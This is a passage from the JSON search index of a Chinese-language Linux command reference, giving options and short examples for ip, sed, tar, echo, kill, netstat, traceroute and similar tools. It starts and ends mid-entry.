00:1e:4f:c8:43:fc                接口的 MAC（硬件）地址\nbrd ff:ff:ff:ff:ff:ff                       广播地址\ninet 192.168.0.24/24                        IPv4 地址\nbrd 192.168.0.255                           广播地址\nscope global                                全局有效\ndynamic enp0s25                             地址是动态分配的\nvalid_lft 80866sec                          IPv4 地址的有效使用期限\npreferred_lft 80866sec                      IPv4 地址的首选生存期\ninet6 fe80::2c8e:1de0:a862:14fd/64          IPv6 地址\nscope link                                  仅在此设备上有效\nvalid_lft forever                           IPv6 地址的有效使用期限\npreferred_lft forever                       IPv6 地址的首选生存期 例: root@6378b4ca047d:/# ip address show to 172.17.0.3/16\n76: eth0@if77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default  link-netnsid 0\n    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0\n    valid_lft forever preferred_lft forever","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-IP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-IP.html"},{"title":"journalctl","text":"在 systemd 下, 内核和系统的信息都通过日志服务 systemd-journald.service (又名 journald )来记录，\n放在 /var/log/journal 下的不变的二进制数据，\n或放在\" /run/log/journal/ \"下的变化的二进制数据.\n这些二进制日志数据，可以通过 journalctl 命令来访问。 例如，你可以显示从最后一次启动以来的日志，按如下所示: journalctl -b\n\n操作                                                                            命令片段\n查看从最后一次启动开始的系统服务和内核日志 \"journalctl -b --system\"\n查看从最后一次启动开始的当前用户的服务日志 \"journalctl -b --user\"\n查看从最后一次启动开始的 \"$unit\" 工作日志     \"journalctl -b -u $unit\"\n查看从最后一次启动开始的 \"$unit\"的工作日志 (\"tail -f\" 式样)                                                                                              \"journalctl -b -u $unit -f\"","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Journalctl.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Journalctl.html"},{"title":"mv","text":"为文件或目录改名、或将文件或目录移入其它位置","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-MV.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-MV.html"},{"title":"modinfo","text":"显示 Linux 内核模块信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Modinfo.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Modinfo.html"},{"title":"sed","text":"流式文本编辑器 利用脚本来处理文本文件。 sed 可依照脚本的指令来处理、编辑文本文件。 Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。 语法: sed [-hnV][-e<script>][-f<script文件>][文本文件] 选项参数 -n , --quiet , --silent 仅显示处理后的结果 -e <script> , --expression= <script> 指定sed编辑命令. 以选项中指定的script来处理输入的文本文件 -i 直接修改读取的文件内容，而不是输出到终端。 -f <script> , --file= <script> 以选项中指定的script文件来处理输入的文本文件.\n直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作； -r sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法) -h , --help 显示帮助。 -V , --version 显示版本信息 文本操作方式 流式文本编辑器: a\\  # 在当前行下面插入文本。\ni\\  # 在当前行上面插入文本。\nc\\  # 把选定的行改为新的文本。\nd   # 删除，删除选择的行。\nD   # 删除模板块的第一行。\ns   # 替换指定字符. 通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g\nh   # 拷贝模板块的内容到内存中的缓冲区。\nH   # 追加模板块的内容到内存中的缓冲区。\ng   # 获得内存缓冲区的内容，并替代当前模板块中的文本。 表示行内全面替换。\nG   # 获得内存缓冲区的内容，并追加到当前模板块文本的后面。\nl   # 列表不能打印字符的清单。\nn   # 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。\nN   # 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。\np   # 打印模板块的行。通常 p 会与参数 sed -n 一起运行\nP   # (大写) 打印模板块的第一行。\nq   # 退出Sed。\n\nb lable     # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。\nr file      # 从file中读行。\nt label     # if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nT label     # 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nw file      # 写并追加模板块到file末尾。 表示把行写入一个文件。\nW file      # 写并追加模板块的第一行到file末尾。\n\n!   # 表示后面的命令对所有没有被选定的行发生作用。\n=   # 打印当前行号码。\n#   # 把注释扩展到下一个换行符以前。\nx   # 表示互换模板块中的文本和缓冲区中的文本。\ny   # 表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n\\1  # 子串匹配标记\n&   # 已匹配字符串标记\n$   # 可表示最后一行, 支持用 $-1 来表示倒数第二行等... 技巧 可以sed加文件名: sed \":a;N;s/\\n//g;ta\" a.txt sed是按行处理文本数据的，每次处理一行数据后，都会在行尾自动添加trailing newline，其实就是行的分隔符即换行符。 sed元字符集: &#94;       # 匹配行开始，如：/&#94;sed/匹配所有以sed开头的行。\n$       # 匹配行结束，如：/sed$/匹配所有以sed结尾的行。\n.       # 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。\n*       # 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。\n[]      # 匹配一个指定范围内的字符，如/[ss]ed/匹配sed和Sed。\n[&#94;]     # 匹配一个不在指定范围内的字符，如：/[&#94;A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。\n\\(..\\)  # 匹配子串，保存匹配的字符，如s/\\(love\\)able/\\1rs，loveable被替换成lovers。\n&       # 保存搜索字符用来替换其他字符，如s/love/ **&** /，love这成 **love** 。\n\\<      # 匹配单词的开始，如:/\\<love/匹配包含以love开头的单词的行。\n\\>      # 匹配单词的结束，如/love\\>/匹配包含以love结尾的单词的行。\n\nx\\{m\\}      # 重复字符x，m次，如：/0\\{5\\}/匹配包含5个0的行。\nx\\{m,\\}     # 重复字符x，至少m次，如：/0\\{5,\\}/匹配至少有5个0的行。\nx\\{m,n\\}    # 重复字符x，至少m次，不多于n次，如：/0\\{5,10\\}/匹配5~10个0的行。 sed替换标记: g # 表示行内全面替换。\np # 表示打印行。\nw # 表示把行写入一个文件。\nx # 表示互换模板块中的文本和缓冲区中的文本。\ny # 表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n\\1 # 子串匹配标记\n& # 已匹配字符串标记 例 删除\"234\"的行（整行删除）: echo -e \"123\\n234\\n342\\n\" | sed '/&#94;234$/d' 删除第二行: echo -e \"123\\n234\\n342\\n\" | sed 2d 替换空格: echo -e \"123\\n12\\n23\" | sed \":a;N;s/\\n//g;ta\"\n# tr \"\\n\" \"\" 就好了\n# N是把下一行加入到当前的hold space模式空间里，使之进行后续处理，最后sed会默认打印hold space模式空间里的内容。也就是说，sed是可以处理多行数据的。\n# :a和ta是配套使用，实现跳转功能。t是test测试的意思。\n# 另外，还有:a和ba的配套使用方式，也可以实现跳转功能。b是branch分支的意思。 打印4-10行: sed -n '4,10p' file 仅匹配字符串: echo \"abcde\" | sed 's/a\\(.*\\)e/\\1/g'\n# bcd      (结果)\n# \\(...\\) 表示仅匹配子串\n# \\1    表示子串 已匹配结果: echo 'qwer' | sed 's/\\w\\+/\"&\"/g'\n# \"qwer\" 替换单引号 原因暂时没有查到，只找到说加$可以转义bash: sed $'s/\\'//g' 注解 sed后面可以不用三个斜杠，只要是三个相同的字符就行，这一点就比较神奇。 打印文件以hhh开始的所有行: sed -n '/hhh/,\\$p' $file 删除空行: sed '/&#94;\\s*$/d' $file 在第一行插入一行qwe(Mac的sed不支持使用i): echo 123 | sed '1 i\\qwe'","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SED.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SED.html"},{"title":"stat","text":"查看文件的状态","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-STAT.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-STAT.html"},{"title":"tr","text":"tr命令 可以对来自标准输入的字符进行替换、压缩和删除。 语法: tr(选项)(参数) 选项 -c , --complerment 取代所有不属于第一字符集的字符； -d , --delete 删除所有属于第一字符集的字符； -s , --squeeze-repeats 把连续重复的字符以单独一个字符表示； -t , --truncate-set1 先删除第一字符集较第二字符集多出的字符。 参数 字符集1 指定要转换或删除的原字符集。 当执行转换操作时，必须使用参数 \"字符集2\" 指定转换的目标字符集。 但执行删除操作时，不需要参数 \"字符集2\"； 字符集2 指定要转换成的目标字符集 字符集合的范围: \\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)\n\\\\ 反斜杠\n\\a Ctrl-G 铃声\n\\b Ctrl-H 退格符\n\\f Ctrl-L 走行换页\n\\n Ctrl-J 新行\n\\r Ctrl-M 回车\n\\t Ctrl-I tab键\n\\v Ctrl-X 水平制表符\nCHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。\n[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止\n[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)\n[:alnum:] ：所有字母字符与数字\n[:alpha:] ：所有字母字符\n[:blank:] ：所有水平空格\n[:cntrl:] ：所有控制字符\n[:digit:] ：所有数字\n[:graph:] ：所有可打印的字符(不包含空格符)\n[:lower:] ：所有小写字母\n[:print:] ：所有可打印的字符(包含空格符)\n[:punct:] ：所有标点字符\n[:space:] ：所有水平与垂直空格符\n[:upper:] ：所有大写字母\n[:xdigit:] ：所有 16 进位制的数字\n[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符) 例如 换行替换为空格: tr '\\n' ' ' 删除重复的换行: tr -s '\\n' 例: echo \"HELLO WORLD\" | tr 'A-Z' 'a-z'\nhello world","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Sudden.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Sudden.html"},{"title":"tac","text":"跟 cat 相反 tac命令就是将文件反向输出(有缓冲)，刚好和cat输出相反。 语法格式: tac [参数] [文件] 常用参数 -b 在行前而非行尾添加分隔标志 -r 将分隔标志视作正则表达式来解析 -s 使用指定字符串代替换行作为分隔标志 --version 显示版本信息并退出 --help 显示此帮助信息并退出 参考实例 反向列出test.txt文件的内容: [root@linuxcool ~]# cat test.txt\nhello world\nhello linuxcool\nhello linuxprobe\n[root@linuxcool ~]# tac test.txt\nhello linuxprobe\nhello linuxcool\nhello world","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-TAC.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-TAC.html"},{"title":"tar","text":"常用几个: -zcvf             创建新包\n-zxvf             解压包\n-tf               查看包内文件列表 选项 -c , --create 建立新的备份文件 -C <dir> 切换工作目录，先进入指定目录再执行压缩/解压缩操作， -x , --extract , --get 从归档文件中提取文件，可以搭配-C（大写）在特定目录解开 -z , --gzip , --ungzip 通过gzip指令压缩/解压缩文件，文件名最好为*.tar.gz -v , --verbose 显示指令执行过程 -t 查看打包好的tar包内容(不解包查看) -f <tar_file> , --file= <tar_file> 指定备份文件； -d 记录文件的差别； -r 添加文件到已经压缩的文件； -u 添加改变了和现有的文件到已经存在的压缩文件； -j 通过bzip2指令压缩/解压缩文件，文件名最好为*.tar.bz2； -l 文件系统边界设置； -k 保留原有文件不覆盖； -m 保留文件不被覆盖； -w 确认压缩文件的正确性； --exclude= <exclude_list> 排除不打包文件, 支持通配符 -p , --same-permissions 保留原来的文件权限与属性,\n这里指的是文件的特殊属性, 因为tar默认就会恢复文件权限与属性 -P , --absolute-names 使用文件名的绝对路径，不移除文件名称前的\"/\"号 --owner= user1 指定解压后的属主, 实际测试没用 --group= group1 指定解压后的属组, 实际测试没用 -N <日期格式> , --newer= <日期时间> 只将较指定日期更新的文件保存到备份文件里； --remove-files 归档/压缩之后删除源文件 -–strip-components=NUMBER 解压时从文件名中清除 NUMBER 个引导部分, 即抛弃前NUMBER个路径 全部 -A , --catenate 新增文件到以存在的备份文件； -B 设置区块大小； -c , --create 建立新的备份文件； -C <目录> 切换工作目录，先进入指定目录再执行压缩/解压缩操作，可用于仅压缩特定目录里的内容, 解压缩到特定目录； -d 记录文件的差别； -x , --extract , --get 从归档文件中提取文件，可以搭配-C（大写）在特定目录解开，\n需要注意的是-c、-t、-x不可同时出现在一串命令中； -t , --list 列出备份文件的内容； -z , --gzip , --ungzip 通过gzip指令压缩/解压缩文件，文件名最好为*.tar.gz； -Z , --compress , --uncompress 通过compress指令处理备份文件； -f <备份文件> , --file= <备份文件> 指定备份文件； -v , --verbose 显示指令执行过程； -r 添加文件到已经压缩的文件； -u 添加改变了和现有的文件到已经存在的压缩文件； -j 通过bzip2指令压缩/解压缩文件，文件名最好为*.tar.bz2； -v 显示操作过程； -l 文件系统边界设置； -k 保留原有文件不覆盖； -m 保留文件不被覆盖； -w 确认压缩文件的正确性； -p , --same-permissions 保留原来的文件权限与属性； -P , --absolute-names 使用文件名的绝对路径，不移除文件名称前的\"/\"号； -N <日期格式> , --newer= <日期时间> 只将较指定日期更新的文件保存到备份文件里； --exclude= <范本样式> 排除符合范本样式的文件； --remove-files 归档/压缩之后删除源文件 如: tar zxf xxx.tar.gz -–strip-components=1 假定原包内文件为: a/b/c , 使用 -–strip-components=1 后, 解压后的内容仅有 b/c (去除了前一层目录) 删除归档中文件 只能删除tar包. gz不行(Mac下不行): tar --delete -vf xxx.tar need_delete_file tar默认行为说明 关于tar保留文件权限与属性的说明: tar默认会尽量保留普通的文件权限与属性(如所有者, 权限号), 不能保留特殊的属性 特殊的权限需要使用 -p 才能保留, 如设备文件、符号链接、ACLs等 关于报错： file changed as we read it 是因为在打包的过程中文件发生了变化，所以导致报错，但是打包依然进行并且有效。\n在使用tar命令时加上--warning=no-file-changed参数即可不输出报错。 关于报错 tar: write error 暂时不知道原因, 可能同一个脚本使用不同的渠道执行就会有这个报错,\n搜了一下也没搜到 暂时发现, 去掉v参数或者重定向到null可以解决 tar相关权限变化 默认情况下, 压缩文件时的用户权限变化： 以超级用户（root）身份运行tar命令, 保留所有文件和目录的所有权和权限信息 以普通用户身份运行tar命令，则压缩后的归档文件将会保留文件的所有权信息,\n但不会包含文件的权限信息 解压缩文件时的用户权限变化： 以超级用户身份运行tar命令来解压缩归档文件,\n则解压后的文件将保持其原始的所有权和权限信息。 以普通用户身份运行tar命令来解压缩归档文件\n则解压后的文件将被赋予该用户的所有权，并且文件权限可能会被设置为默认值（通常是较为宽松的权限）. 文件所有权指, 属主属组 文件权限指, 755这种","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-TAR.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-TAR.html"},{"title":"cat","text":"用于连接文件并打印到标准输出设备上， 由第一行开始显示内容，并将所有内容输出","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-cat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-cat.html"},{"title":"echo","text":"回显，就是显示正在执行的批处理命令及执行的结果等 选项 echo选项 -n: 不换行输出 -e: 激活转义字符。使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出： \\a 发出警告声； \\b 删除前一个字符； \\c 最后不加上换行符号； \\f 换行但光标仍旧停留在原来的位置； \\n 换行且光标移至行首； \\r 光标移至行首，但不换行； \\t 插入tab； \\v 与\\f相同； \\\\ 插入\\字符； \\nnn 插入nnn（八进制）所代表的ASCII字符； 技巧 在脚本中echo自带转义功能 使用 echo -e \"\\e[1;36m ${ _strs } \\e[0m\\n\" 技巧 例子的这种情况官方建议使用 printf 对于颜色输出而言, echo的 \\e 和 \\033 一个效果 echo vs /bin/echo echo 是shell内置命令 /bin/echo 是可执行文件 通常来说，内建命令会比外部命令执行得更快，执行外部命令时不但会触发磁盘 I/O，\n还需要 fork 出一个单独的进程来执行，执行完成后再退出。\n而执行内建命令相当于调用当前 Shell 进程的一个函数。 目前来说遇到的一些区别: /bin/echo 参数触发 Argument list too long的临界点是 131072\n\necho 暂时没测试到有限制 输出带颜色 颜色表见 颜色表与代码表 格式: echo -e \"\\033[字背景颜色;字体颜色m字符串\\033[0m\" 例如 打印红色输出: echo -e \"\\e[1;31m 内容 \\e[0m\"\n#\\e[1;31m 将颜色设置为红色\n#\\e[0m 将颜色重新置回\n#颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37 ANSI控制码的说明: \\33[0m 关闭所有属性\n\\33[1m 设置高亮度\n\\33[4m 下划线\n\\33[5m 闪烁\n\\33[7m 反显\n\\33[8m 消隐\n\\33[30m -- \\33[37m 设置前景色\n\\33[40m -- \\33[47m 设置背景色\n\\33[nA 光标上移n行\n\\33[nB 光标下移n行\n\\33[nC 光标右移n行\n\\33[nD 光标左移n行\n\\33[y;xH设置光标位置\n\\33[2J 清屏\n\\33[K 清除从光标到行尾的内容\n\\33[s 保存光标位置\n\\33[u 恢复光标位置\n\\33[?25l 隐藏光标\n\\33[?25h 显示光标\n\n#\\e和\\033一个效果","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-echo.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-echo.html"},{"title":"exec","text":"用于调用并执行指令的命令。 exec命令通常用在shell脚本程序中，可以调用其他的命令。\n如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。 语法: exec(选项)(参数) 选项 -c 在空环境中执行指定的命令。 如: exec -c echo Linux C++          # 调用命令执行，执行完毕后退出","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-exec.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-exec.html"},{"title":"groupadd","text":"用于创建一个新的工作组","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-groupadd.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-groupadd.html"},{"title":"gunzip","text":"用来解压缩文件（等价于gzip -d） 相关指令 gzip","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-gunzip.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-gunzip.html"},{"title":"ifcofig","text":"配置和显示Linux系统网卡的网络参数 可结合 watch 查看实时网速 watch -n 1 ifconfig 输出说明 RX: 接收流量 TX: 发送流量 计算方法： (KB = 数值/1000) (MB = 数值/100000)","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ifconfig.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ifconfig.html"},{"title":"kill","text":"类似的指令: killall pkill 发送信号 Linux kill 命令用于删除执行中的程序或工作。\nkill 可将指定的信息送至程序。\n预设的信息为 SIGTERM(15)，可将指定程序终止。\n若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。 程序或工作的编号可利用 ps 指令或 jobs 指令查看。 语法: kill [-s <信息名称或编号>][程序]  或  kill [-l <信息编号>] 参数说明: -l <信息编号>  若不加<信息编号>选项，则 -l 参数会列出全部的信息名称。\n-s <信息名称或编号>  指定要送出的信息。\n[程序]  [程序]可以是程序的PID或是PGID，也可以是工作编号。 使用 kill -l 命令列出所有可用信号 最常用的信号是: 1 (HUP)：重新加载进程。\n9 (KILL)：杀死一个进程。\n15 (TERM)：正常停止一个进程。 发送SIGHUP信号，可以使用一下信号: kill -HUP pid 彻底杀死进程: kill -9 123456\n\n# 或者  kill -KILL 123456 杀死指定用户所有进程: kill -9 $(ps -ef | grep hnlinux) //方法一 过滤出hnlinux用户进程\nkill -u hnlinux //方法二","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-kill.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-kill.html"},{"title":"killall","text":"相似的指令: pkill kill 使用进程的名称来杀死一组进程 Linux killall 用于杀死一个进程，与 kill 不同的是它会杀死指定名字的所有进程。\nkill 命令杀死指定进程 PID，需要配合 ps 使用，而 killall 直接对进程对名字进行操作，更加方便。 语法: killall [选项]  name 参数说明: name ： 进程名 选项包含如下几个参数: -e | --exact ： 进程需要和名字完全相符\n-I | --ignore-case ：忽略大小写\n-g | --process-group ：结束进程组\n-i | --interactive ：结束之前询问\n-l | --list ：列出所有的信号名称\n-q | --quite ：进程没有结束时，不输出任何信息\n-r | --regexp ：将进程名模式解释为扩展的正则表达式。\n-s | --signal ：发送指定信号\n-u | --user ：结束指定用户的进程\n-v | --verbose ：显示详细执行过程\n-w | --wait ：等待所有的进程都结束\n-V |--version ：显示版本信息\n--help ：显示帮助信息 实例, 结束所有的 php-fpm 进程: killall -9 php-fpm","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-killLALL.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-killLALL.html"},{"title":"lsb_release","text":"如果没有, 使用以下指令安装: apt install lsb-core LSB是Linux Standard Base的缩写, Isb_release命令用来显示LSB和特定版本的相关信息(查看当前系统的发行版信息)。 语法: lsb_release [参数] 选项参数 -i 显示系统名称简写 -v 显示lsb版本信息 -d 显示系统全称和版本号 -r 显示版本号 -a 显示LSB所有信息 -h 查看lsb_release支持的所有参数 无参数时默认加上-v 参数。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-lsb_release.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-lsb_release.html"},{"title":"man","text":"man可以查看命令的用法 一般可以先使用\"whatis ‘命令'\"来查看命令相关信息，\n再使用\"man ‘命令'\"来查看命令的具体使用 翻屏: 向后翻一屏：space(空格键)       向前翻一屏：b\n向后翻一行：Enter(回车键)       向前翻一行：k 按键与用处: 按键          用处\n空格键       向下翻一页。\n[Page Down] 向下翻一页。\n[Page Up]   向上翻一页。\n[HOME]      直接前往首页。\n[END]       直接前往尾页。\n/关键词      从上至下搜索某个关键词,如\"/linux\"。\n?关键词      从下至上搜索某个关键词,如\"?linux\"。\nn           定位到下一个搜索到的关键词。\nN           定位到上一个搜索到的关键词。\nq           退出帮助文档。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-man.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-man.html"},{"title":"netstat","text":"Ubuntu安装: apt install net-tools -y 注解 net-tools包含arp, ifconfig, netstat, rarp, nameif and route命令，如果使用这些命令报错，可以尝试安装。 功能 查看网络状态 Linux netstat 命令用于显示网络状态。利用 netstat 指令可让你得知整个 Linux 系统的网络情况。 使用: netstat [-acCeFghilMnNoprstuvVwx][-A<网络类型>][--ip] 选项参数 netstat选项参数 选项 含义 -a/--all 显示所有连线中的Socket -n/--numeric 以ip形式显示当前建立的有效连接和端口.直接使用IP地址，而不通过域名服务器 -u/--udp 显示UDP传输协议的连线状况。 -t/--tcp 显示TCP传输协议的连线状况。 -p/--programs 显示对应PID与程序名. 显示正在使用Socket的程序识别码和程序名称。 A<网络类型>或--<网络类型> 列出该网络类型连线中的相关地址。 -c/--continuous 持续列出网络状态。 -C/--cache 显示路由器配置的快取信息。 -e/--extend 显示网络其他相关信息。 -F/--fib 显示路由缓存。 -g/--groups 显示多重广播功能群组组员名单。 -h/--help 在线帮助。 -i --interfaces 显示网络界面信息表单。 -l/--listening 显示监控中的服务器的Socket。 -M/--masquerade 显示伪装的网络连线。 -N/--netlink/--symbolic 显示网络硬件外围设备的符号连接名称。 -o/--timers 显示计时器。 -r/--route 显示Routing Table。 -s/--statistics 显示网络工作信息统计表。 -v/--verbose 显示指令执行过程。 -V/--version 显示版本信息。 -w/--raw 显示RAW传输协议的连线状况。 -x/--unix 此参数的效果和指定\"-A unix\"参数相同。 --ip/--inet 此参数的效果和指定\"-A inet\"参数相同。 注解 常用: netstat -anutp 常用: #列出所有端口 (包括监听和未监听的)\nnetstat -a     #列出所有端口\nnetstat -at    #列出所有tcp端口\nnetstat -au    #列出所有udp端口\n#列出所有处于监听状态的 Socket\nnetstat -l        #只显示监听端口\nnetstat -lt       #只列出所有监听 tcp 端口\nnetstat -lu       #只列出所有监听 udp 端口\nnetstat -lx       #只列出所有监听 UNIX 端口\n\nnetstat -antup    #显示所有 及 占用程序名 内容解释: Proto        该联机的封包协议\nRecv-Q        非由用户程序连接所复制而来的总 bytes\nSend-Q        由远程主机所传送而来，但不具有ACK标志的总bytes数，意指主动联机SYN或其他标志的封包所占的bytes数\nLocal Address    本地地址\nForeign Address    远程主机地址\nstat        状态栏，有以下\n                ESTABLISED    已建立的联机的状态\n                SYNC_SENT    发出主动联机的联机封包\n                SYNC_RECV    接收到一个要求联机的主动联机封包\n                FIN_WAIT1    该插槽服务socket已中断，该联机正在断线中\n                FIN_WAIT2    该联机已挂断，但正在等待对方主机响应断线确认的封包\n                TIME_WAIT    该联机已挂断，但socket还在网络上等待结束\n                LISTEN        通常在服务的监听port，可使用 -l查询","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-netStat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-netStat.html"},{"title":"route","text":"显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-route.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-route.html"},{"title":"sort","text":"对文本内容以行为单位进行 ASCII 码排序, 默认按照升序进行排序 -n , --numeric-sort 根据数字排序 -r , --reverse 将结果倒序排列。 -k , --key= KEYDEF 通过一个key排序；KEYDEF给出位置和类型\n就是指定排序的列号, 第几列, 支持多个, 按照指定的顺序\n(默认第一行) -t <seq> 指定分隔符 -o <file> 将结果输出到指定文件 -b 忽略每行前面开始出的空格字符。 -c 检查文件是否已经按照顺序排序。 -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。 -f 忽略大小写. 排序时，将小写字母视为大写字母。 -i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。 -m 将几个排序好的文件进行合并。 -M 将前面3个字母依照月份的缩写进行排序。 -n 依照数值的大小排序。 -u 对结果去重. 意味着是唯一的(unique)，输出的结果是去完重了的。 -t <分隔字符> 指定排序时所用的栏位分隔字符。 -o <输出文件> 将排序后的结果存入指定的文件。 其他: +<起始栏位>-<结束栏位>        以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。 如指定以第六, 七列的顺序排序(写一起之支持单数行号): ls -lh | sort -k6 -k7\n# ls -lh | sort -k67 还以精确到列的第几个字符, 如第六列的第一个字符(默认行为): ls -lh | sort -k6.1","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-sort.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-sort.html"},{"title":"ls","text":"查看目录文件信息 -l 详细信息 -t 按时间排序 -i 输出innode信息 --block-size --block-size=m 以M为单位 --block-size=G 以G为单位 ls -l 输出的第一个字符列表 输出列含义 字符 说明 普通文件 d 目录 l 符号链接 c 字符设备节点 b 块设备节点 p 命名管道 s 套接字","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-teacher.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-teacher.html"},{"title":"top","text":"显示或管理执行中的程序，实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。 选项 -b 以批处理模式操作； -c 显示完整的治命令； -d 屏幕刷新间隔时间； -I 忽略失效过程； -s 保密模式； -S 累积模式； -i <时间> 设置间隔时间； -u <用户名> 指定用户名； -p <进程号> 指定进程； -n <次数> 循环显示的次数。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-top.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-top.html"},{"title":"traceroute","text":"Linux traceroute命令用于显示数据包到主机间的路径。 traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。 语法: traceroute [-dFlnrvx][-f<存活数值>][-g<网关>...][-i<网络界面>][-m<存活数值>][-p<通信端口>][-s<来源地址>][-t<服务类型>][-w<超时秒数>][主机名称或IP地址][数据包大小] 参数说明 -d 使用Socket层级的排错功能。 -f <存活数值> 设置第一个检测数据包的存活数值TTL的大小； -F 设置勿离断位； -g <网关> 设置来源路由网关，最多可设置8个； -i <网络界面> 使用指定的网络界面送出数据包； -I 使用ICMP回应取代UDP资料信息； -m <存活数值> 设置检测数据包的最大存活数值TTL的大小； -n 直接使用IP地址而非主机名称； -p <通信端口> 设置UDP传输协议的通信端口； -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s <来源地址> 设置本地主机送出数据包的IP地址； -t <服务类型> 设置检测数据包的TOS数值； -v 详细显示指令的执行过程； -w <超时秒数> 设置等待远端主机回报的时间； -x 开启或关闭数据包的正确性检验。 -T 使用tcp发送 -U 使用UDP的port 33434 来进行侦测，只是默认设置 -f <存活数值> 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g <网关> 设置来源路由网关，最多可设置8个。 -i <网络界面> 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m <存活数值> 设置检测数据包的最大存活数值TTL的大小。 TTL表示最大跳数 -n 直接使用IP地址而非主机名称。 -p <通信端口> 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s <来源地址> 设置本地主机送出数据包的IP地址。 -t <服务类型> 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w <超时秒数> 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 显示到达目的地的数据包路由: $ traceroute www.google.com\ntraceroute: Warning: www.google.com has multiple addresses; using 66.249.89.99\ntraceroute to www.l.google.com (66.249.89.99), 30 hops max, 38 byte packets\n1 192.168.0.1 (192.168.0.1) 0.653 ms 0.846 ms 0.200 ms\n2 118.250.4.1 